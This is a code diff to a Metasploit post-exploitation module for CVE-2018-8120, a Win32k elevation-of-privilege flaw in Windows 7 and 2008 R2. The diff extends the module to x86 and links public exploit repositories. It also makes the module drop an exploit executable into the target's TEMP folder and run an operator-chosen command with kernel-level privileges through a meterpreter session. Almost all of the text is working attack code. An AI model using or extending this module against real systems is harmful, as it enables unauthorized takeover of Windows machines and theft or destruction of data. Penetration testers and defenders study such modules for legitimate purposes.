@@ -1,8 +1,9 @@
-# This module requires Metasploit: https://metasploit.com/download
+## This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Post
+    Rank = GoodRanking
 
   include Msf::Post::File
   include Msf::Post::Windows::Registry
@@ -11,14 +12,17 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
       'Name'        => 'Win32k Elevation of Privilege Vulnerability',
       'Description' => %q{
-        This module exploits elevation of privilege vulnerability exists in Windows when the Win32k
-        component fails to properly handle objects in memory. An attacker who successfully exploited
-        this vulnerability could run arbitrary code in kernel mode. An attacker could then install
-        programs; view, change, or delete data; or create new accounts with full user rights.},
+        This module exploits elevation of privilege vulnerability exists in Windows 7 and 2008 R2
+        when the Win32k component fails to properly handle objects in memory. An attacker who 
+        successfully exploited this vulnerability could run arbitrary code in kernel mode. An 
+        attacker could then install programs; view, change, or delete data; or create new 
+        accounts with full user rights.},
       'References'  =>
         [
           ['CVE', '2018-8120'],
           ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120'],
+          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html'],
+          ['URL', 'https://github.com/bigric3/cve-2018-8120'],
           ['URL', 'https://github.com/unamer/CVE-2018-8120']
         ],
       'Author'      =>
@@ -28,15 +32,14 @@ class MetasploitModule < Msf::Post
           'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit module
         ],
       'DisclosureDate' => 'Aug 05 2018',
-      'Arch'           => [ARCH_X64],
+      'Arch'           => [ARCH_X64, ARCH_X86],
       'SessionTypes'   => ['meterpreter'],
       'License'        => MSF_LICENSE
     ))
 
     register_options(
       [
-         OptString.new('POCCMD', [true, 'The command to run from CVE-2018-8120.exe']),
-         OptString.new('READFILE', [ false, 'Read a remote file: ', 'C:\\Windows\\boot.ini' ])
+         OptString.new('POCCMD', [true, 'The command to run from poc.sct']),
       ])
   end
 
@@ -71,16 +74,17 @@ class MetasploitModule < Msf::Post
       raw = create_payload_from_file rexe
       script_on_target = write_exe_to_target(raw, rexename)
 
-      print_status('Starting module...')
-      print_line('')
+      print_status('Starting module..')
+      print_line
 
       command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
       print_status("Location of CVE-2018-8120.exe is: #{command}")
-
+      command += " "
+      command += "#{poccmd}"
       print_status("Executing command : #{command}")
       command_output = cmd_exec(command)
       print_line(command_output)
-      print_line('')
+      print_line
 
   end
 end
